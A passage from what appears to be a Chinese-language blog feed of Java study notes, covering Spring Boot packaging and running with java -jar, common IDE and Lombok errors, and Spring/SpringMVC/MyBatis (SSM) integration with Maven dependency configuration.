<h3 id="打包和运行"><a href="#打包和运行" class="headerlink" title="打包和运行"></a>打包和运行</h3><p>普通web项目打包成war包部署到tomcat运行，但SrpingBoot中含有内置的Tomcat，因此打包成<code>jar</code></p>
<h4 id="添加打包插件"><a href="#添加打包插件" class="headerlink" title="添加打包插件"></a>添加打包插件</h4><p>在Spring Boot项目中添加<code>spring-boot-maven-plugin</code>插件是为了支持将项目打包成可执行的可运行jar包。如果不添加spring-boot-maven-plugin插件配置，使用常规的java -jar命令来运行打包后的Spring Boot项目是无法找到应用程序的入口点，因此导致无法运行。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- version和parent中的version 保持一致--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h4><p>点击运行maven的package插件即可，会生成jar包，在target目录下可见，original后缀的文件只包含自己的代码；jar后缀包含所有依赖，可以直接运行</p>
<h4 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h4><p>java -jar命令用于在Java环境中执行可执行的JAR文件。下面是关于java -jar命令的说明：<br>命令格式：参数、选项必须写在文件前</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">java -jar [选项] [参数] &lt;jar文件名&gt;</span><br></pre></td></tr></table></figure>

<ol>
<li><code>-D&lt;name&gt;=&lt;value&gt;</code>：设置系统属性，可以通过System.getProperty()方法在应用程序中获取该属性值。例如：</li>
</ol>
  <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">java -jar -Dserver.port=<span class="number">8080</span> myapp.jar</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p><code>-X</code>：设置JVM参数，例如内存大小、垃圾回收策略等。常用的选项包括：<br> <code>-Xmx&lt;size&gt;</code>：设置JVM的最大堆内存大小，例如 -Xmx512m 表示设置最大堆内存为512MB。<br> <code>-Xms&lt;size&gt;</code>：设置JVM的初始堆内存大小，例如 -Xms256m 表示设置初始堆内存为256MB。</p>
</li>
<li><p><code>-Dspring.profiles.active=&lt;profile&gt;</code>：指定Spring Boot的激活配置文件，可以通过<code>application-  &lt;profile&gt;.properties</code>或<code>application-&lt;profile&gt;.yml</code>文件来加载相应的配置。例如:</p>
</li>
</ol>
  <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">java -jar -Dspring.profiles.active=dev myapp.jar</span><br></pre></td></tr></table></figure>

<h2 id="其他常用starter"><a href="#其他常用starter" class="headerlink" title="其他常用starter"></a>其他常用starter</h2><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><h4 id="依赖："><a href="#依赖：" class="headerlink" title="依赖："></a>依赖：</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 测试环境 引入包括JUnit在内的多种测试工具--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h4><p>在测试类前添加<code>@SpringBootTest</code>注解，正常编写测试方法即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MybatisPlus</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper userMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        List&lt;User&gt; users = userMapper.selectList(<span class="literal">null</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;employees=&quot;</span> + users);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



































































































<h1 id="Springboot2"><a href="#Springboot2" class="headerlink" title="Springboot2"></a>Springboot2</h1><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.14<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>17<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">springfox-version</span>&gt;</span>3.0.0<span class="tag">&lt;/<span class="name">springfox-version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Spring Boot Web Starter --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Test Dependency --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.14<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure>















<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="常见错误-问题"><a href="#常见错误-问题" class="headerlink" title="常见错误&#x2F;问题"></a>常见错误&#x2F;问题</h2><h4 id="IDEA中properties配置文件配置项变灰色"><a href="#IDEA中properties配置文件配置项变灰色" class="headerlink" title="IDEA中properties配置文件配置项变灰色"></a>IDEA中properties配置文件配置项变灰色</h4><p>文件&#x3D;》项目结构&#x3D;》模块 &#x3D;》源 &#x3D;》src&#x2F;main&#x2F;resources &#x3D;》资源 &#x3D;》应用</p>
<h4 id="lombok插件与SpringBoot冲突错误"><a href="#lombok插件与SpringBoot冲突错误" class="headerlink" title="lombok插件与SpringBoot冲突错误"></a>lombok插件与SpringBoot冲突错误</h4><p><strong>错误信息：</strong></p>
<blockquote>
<p>java: java.lang.NoSuchFieldError: Class  com.sun.tools.javac.tree.JCTree$JCImport does not have member field  ‘com.sun.tools.javac.tree.JCTree qualid’</p>
</blockquote>
<p><strong>原因：</strong></p>
<p>Lombok在早期版本中使用反射访问com.sun.tools.javac.tree.JCTree$JCImport类的<code>qualid</code>字段,该字段在Java 21中的类型发生了变化</p>
<p><strong>解决方案：</strong></p>
<p>使用lombok   1.18.30+版本</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>1.18.30<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="主应用程序类-添加-SpringBootApplication注解的类-类名红线，出现：默认软件包中的spring-boot应用程序"><a href="#主应用程序类-添加-SpringBootApplication注解的类-类名红线，出现：默认软件包中的spring-boot应用程序" class="headerlink" title="主应用程序类(添加@SpringBootApplication注解的类)类名红线，出现：默认软件包中的spring boot应用程序"></a>主应用程序类(添加@SpringBootApplication注解的类)类名红线，出现：默认软件包中的spring boot应用程序</h4><p><strong>错误信息：</strong></p>
<blockquote>
<p>默认软件包中的spring boot应用程序</p>
</blockquote>
<p><strong>原因：</strong></p>
<p>在使用Spring  Boot时，将应用程序的主类放置在默认包中可能会导致错误。默认包是指没有明确声明包名的情况，即主类直接位于Java目录下。这种做法会导致Spring Boot的自动配置功能无法正确扫描和加载组件，因为@SpringBootApplication注解会自动扫描当前包及其子包中的所有组件。当主类位于默认包中时，Spring Boot无法确定要扫描的包路径，因为默认包没有子包的概念。这会导致Spring Boot无法加载应用程序所需的组件，从而引发错误。</p>
<p><strong>解决方案</strong></p>
<p>要解决这个问题，需要将主类移动到一个具体的包中，这样Spring Boot就可以通过包路径来扫描和加载组件。例如，可以创建一个名为<em>com.example</em>的包，并将主类放置在该包中。这样，Spring Boot就能够识别出要扫描的包路径，并加载相应的组件。</p>
<h4 id="IDEA中导入spring-boot-maven-plugin插件报红"><a href="#IDEA中导入spring-boot-maven-plugin插件报红" class="headerlink" title="IDEA中导入spring-boot-maven-plugin插件报红"></a>IDEA中导入spring-boot-maven-plugin插件报红</h4><p>不解决也不影响，会自动选择版本。</p>
<p>解决方案：选择与<code>parent</code>中的boot相同的<code>version</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Java</category>
        <category>框架与工具</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-SSM-SSM</title>
    <url>/2025/01/09/Java-SSM-SSM/</url>
    <content><![CDATA[<h1 id="SSM整合理论"><a href="#SSM整合理论" class="headerlink" title="SSM整合理论"></a>SSM整合理论</h1><p>SSM框架如何整合应用？</p>
<ul>
<li>微观：将学习的Spring SpringMVC Mybatis框架应用到项目中!<ul>
<li>SpringMVC框架负责控制层</li>
<li>Spring 框架负责整体和业务层的声明式事务管理</li>
<li>MyBatis框架负责数据库访问层</li>
</ul>
</li>
<li>宏观：Spring接管一切（将框架核心组件交给Spring进行IoC管理），代码更加简洁。<ul>
<li>SpringMVC管理表述层、SpringMVC相关组件</li>
<li>Spring管理业务层、持久层、以及数据库相关（DataSource,MyBatis）的组件</li>
<li>使用IoC的方式管理一切所需组件</li>
</ul>
</li>
<li>实施：通过编写配置文件，实现SpringIoC容器接管一切组件。</li>
</ul>
<h2 id="三层架构"><a href="#三层架构" class="headerlink" title="三层架构"></a>三层架构</h2><table>
<thead>
<tr>
<th>层级名称</th>
<th>职责描述</th>
<th>常见技术实现</th>
</tr>
</thead>
<tbody><tr>
<td><strong>表示层Controller</strong></td>
<td>处理用户交互，接收请求并返回响应（如 HTTP API、Web 页面等）</td>
<td>Spring MVC、Thymeleaf、JSP、RESTful API</td>
</tr>
<tr>
<td><strong>业务逻辑层<br>Service</strong></td>
<td>实现核心业务规则和流程，协调数据访问层的操作</td>
<td>Spring <code>@Service</code>、事务管理、业务逻辑类</td>
</tr>
<tr>
<td><strong>数据访问层<br>Mapper&#x2F;Repository</strong></td>
<td>负责与数据库或其他数据源交互（CRUD 操作）</td>
<td>Spring Data JPA、MyBatis、JDBC、Hibernate</td>
</tr>
</tbody></table>
<h2 id="核心问题"><a href="#核心问题" class="headerlink" title="核心问题"></a>核心问题</h2><h3 id="第一问：SSM整合后需要几个IoC容器？"><a href="#第一问：SSM整合后需要几个IoC容器？" class="headerlink" title="第一问：SSM整合后需要几个IoC容器？"></a>第一问：SSM整合后需要几个IoC容器？</h3><p>两个容器<br>本质上说，整合就是将三层架构和框架核心API组件交给SpringIoC容器管理！<br>一个容器可能就够了，但是我们常见的操作是创建两个IoC容器（web容器和root容器），组件分类管理！<br>这种做法有以下好处和目的：</p>
<ol>
<li>分离关注点：通过初始化两个容器，可以将各个层次的关注点进行分离。这种分离使得各个层次的组件能够更好地聚焦于各自的责任和功能。</li>
<li>解耦合：各个层次组件分离装配不同的IoC容器，这样可以进行解耦。这种解耦合使得各个模块可以独立操作和测试，提高了代码的可维护性和可测试性。</li>
<li>灵活配置：通过使用两个容器，可以为每个容器提供各自的配置，以满足不同层次和组件的特定需求。每个配置文件也更加清晰和灵活。</li>
</ol>
<p>总的来说，初始化两个容器在SSM整合中可以实现关注点分离、解耦合、灵活配置等好处。它们各自负责不同的层次和功能，并通过合适的集成方式协同工作，提供一个高效、可维护和可扩展的应用程序架构！</p>
<h3 id="第二问：每个IoC容器对应哪些类型组件？"><a href="#第二问：每个IoC容器对应哪些类型组件？" class="headerlink" title="第二问：每个IoC容器对应哪些类型组件？"></a>第二问：每个IoC容器对应哪些类型组件？</h3><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20250111112818.png" alt="容器对应组件"></p>
<table>
<thead>
<tr>
<th>容器名</th>
<th>盛放组件</th>
</tr>
</thead>
<tbody><tr>
<td>web容器</td>
<td>web相关组件（controller,springmvc核心组件）</td>
</tr>
<tr>
<td>root容器</td>
<td>业务和持久层相关组件（service,aop,tx,dataSource,mybatis,mapper等）</td>
</tr>
</tbody></table>
<h3 id="第三问：IoC容器之间关系和调用方向？"><a href="#第三问：IoC容器之间关系和调用方向？" class="headerlink" title="第三问：IoC容器之间关系和调用方向？"></a>第三问：IoC容器之间关系和调用方向？</h3><p>情况1：两个无关联IoC容器之间的组件无法注入！</p>
<p>情况2：子IoC容器可以单向的注入父IoC容器的组件！</p>
<p>结论：web容器是root容器的子容器，父子容器关系。</p>
<ul>
<li>父容器：root容器，盛放service、mapper、mybatis等相关组件</li>
<li>子容器：web容器，盛放controller、web相关组件</li>
</ul>
<h3 id="第四问：具体多少配置类以及对应容器关系？"><a href="#第四问：具体多少配置类以及对应容器关系？" class="headerlink" title="第四问：具体多少配置类以及对应容器关系？"></a>第四问：具体多少配置类以及对应容器关系？</h3><p>配置类的数量不是固定的，但是至少要两个，为了方便编写，我们可以三层架构每层对应一个配置类，分别指定两个容器加载即可！</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20250111114012.png"></p>
<p>建议配置文件：</p>
<table>
<thead>
<tr>
<th>配置名</th>
<th>对应内容</th>
<th>对应容器</th>
</tr>
</thead>
<tbody><tr>
<td>WebJavaConfig</td>
<td>controller,springmvc相关</td>
<td>web容器</td>
</tr>
<tr>
<td>ServiceJavaConfig</td>
<td>service,aop,tx相关</td>
<td>root容器</td>
</tr>
<tr>
<td>MapperJavaConfig</td>
<td>mapper,datasource,mybatis相关</td>
<td>root容器</td>
</tr>
</tbody></table>
<h3 id="第五问：IoC初始化方式和配置位置？"><a href="#第五问：IoC初始化方式和配置位置？" class="headerlink" title="第五问：IoC初始化方式和配置位置？"></a>第五问：IoC初始化方式和配置位置？</h3><p>在web项目下，我们可以选择web.xml和配置类方式进行ioc配置，推荐配置类。对于使用基于 web 的 Spring 配置的应用程序，建议这样做，如以下示例所示：</p>
<p><img src="D:\workinenglish\typora_image\image-20250111114515495.png" alt="image-20250111114515495"></p>
<hr>
<h2 id="配置实战"><a href="#配置实战" class="headerlink" title="配置实战"></a>配置实战</h2><h3 id="依赖整合和添加"><a href="#依赖整合和添加" class="headerlink" title="依赖整合和添加"></a>依赖整合和添加</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">SSM依赖整合</span></span><br><span class="line"><span class="comment">需要依赖清单分析:</span></span><br><span class="line"><span class="comment">spring</span></span><br><span class="line"><span class="comment">    ioc/di</span></span><br><span class="line"><span class="comment">        spring-context / 6.0.6</span></span><br><span class="line"><span class="comment">            提供了Spring IoC容器的基础功能，用于管理Java对象的创建和生命周期</span></span><br><span class="line"><span class="comment">        jakarta.annotation-api / 2.1.1</span></span><br><span class="line"><span class="comment">            提供了JSR-250标准的注解支持，如@PostConstruct, @PreDestroy等</span></span><br><span class="line"><span class="comment">    aop</span></span><br><span class="line"><span class="comment">        spring-aspects / 6.0.6</span></span><br><span class="line"><span class="comment">            支持基于AspectJ的AOP编程，允许你定义方法拦截器和切入点，以便干净地分离代码逻辑</span></span><br><span class="line"><span class="comment">    tx</span></span><br><span class="line"><span class="comment">        spring-tx / 6.0.6  </span></span><br><span class="line"><span class="comment">            提供了对事务的支持，包括声明式事务管理和编程式事务管理</span></span><br><span class="line"><span class="comment">        spring-jdbc / 6.0.6  </span></span><br><span class="line"><span class="comment">            简化了JDBC的使用，提供了更便捷的数据访问异常层次结构，并且无需编写繁琐的JDBC代码</span></span><br><span class="line"><span class="comment">springmvc</span></span><br><span class="line"><span class="comment">    spring-webmvc 6.0.6  </span></span><br><span class="line"><span class="comment">        Spring框架中用于构建Web应用的模块，实现了MVC设计模式</span></span><br><span class="line"><span class="comment">    jakarta.jakartaee-web-api 9.1.0  </span></span><br><span class="line"><span class="comment">        提供Jakarta EE Web API的规范类库，确保与Servlet API兼容</span></span><br><span class="line"><span class="comment">    jackson-databind 2.15.0  </span></span><br><span class="line"><span class="comment">        高效的JSON处理工具，用于将Java对象转换为JSON格式以及反向操作</span></span><br><span class="line"><span class="comment">    hibernate-validator / hibernate-validator-annotation-processor 8.0.0.Final  </span></span><br><span class="line"><span class="comment">        提供Bean验证功能，支持通过注解进行数据校验</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">mybatis</span></span><br><span class="line"><span class="comment">    mybatis / 3.5.11  </span></span><br><span class="line"><span class="comment">        MyBatis核心库，简化了数据库操作，提供SQL映射功能</span></span><br><span class="line"><span class="comment">    mysql / 8.0.25  </span></span><br><span class="line"><span class="comment">        MySQL数据库驱动，使得Java应用程序能够连接到MySQL数据库</span></span><br><span class="line"><span class="comment">    pagehelper / 5.1.11  </span></span><br><span class="line"><span class="comment">        MyBatis的物理分页插件，可以非常方便地实现分页查询</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">整合需要</span></span><br><span class="line"><span class="comment">    加载spring容器 spring-web / 6.0.6  </span></span><br><span class="line"><span class="comment">        包含了建立Spring web应用程序所需的基础功能，例如文件上传机制、Http请求响应处理等</span></span><br><span class="line"><span class="comment">    整合mybatis mybatis-spring  </span></span><br><span class="line"><span class="comment">        用于MyBatis与Spring框架的集成，使得可以在Spring上下文中使用MyBatis</span></span><br><span class="line"><span class="comment">    数据库连接池 druid / x  </span></span><br><span class="line"><span class="comment">        Druid是一个高性能的数据库连接池，提供了监控和强大的扩展能力</span></span><br><span class="line"><span class="comment">    lombok lombok / 1.18.26  </span></span><br><span class="line"><span class="comment">        减少样板代码，通过注解自动生成一些基础代码如getter/setter, constructor等</span></span><br><span class="line"><span class="comment">    logback logback/ 1.2.3  </span></span><br><span class="line"><span class="comment">        强大可靠的日志框架，作为log4j的替代品，提供了更好的性能和灵活性</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure>

<p>配置如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fu<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>SSM<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">spring.version</span>&gt;</span>6.0.6<span class="tag">&lt;/<span class="name">spring.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">jakarta.annotation-api.version</span>&gt;</span>2.1.1<span class="tag">&lt;/<span class="name">jakarta.annotation-api.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">jakarta.jakartaee-web-api.version</span>&gt;</span>9.1.0<span class="tag">&lt;/<span class="name">jakarta.jakartaee-web-api.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">jackson-databind.version</span>&gt;</span>2.15.0<span class="tag">&lt;/<span class="name">jackson-databind.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">hibernate-validator.version</span>&gt;</span>8.0.0.Final<span class="tag">&lt;/<span class="name">hibernate-validator.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mybatis.version</span>&gt;</span>3.5.11<span class="tag">&lt;/<span class="name">mybatis.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mysql.version</span>&gt;</span>8.0.25<span class="tag">&lt;/<span class="name">mysql.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pagehelper.version</span>&gt;</span>5.1.11<span class="tag">&lt;/<span class="name">pagehelper.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">druid.version</span>&gt;</span>1.2.8<span class="tag">&lt;/<span class="name">druid.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mybatis-spring.version</span>&gt;</span>3.0.2<span class="tag">&lt;/<span class="name">mybatis-spring.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">jakarta.servlet.jsp.jstl-api.version</span>&gt;</span>3.0.0<span class="tag">&lt;/<span class="name">jakarta.servlet.jsp.jstl-api.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">logback.version</span>&gt;</span>1.2.3<span class="tag">&lt;/<span class="name">logback.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">lombok.version</span>&gt;</span>1.18.26<span class="tag">&lt;/<span class="name">lombok.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>17<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>17<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--spring pom.xml依赖--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>jakarta.annotation<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jakarta.annotation-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;jakarta.annotation-api.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-aop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-aspects<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-tx<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span 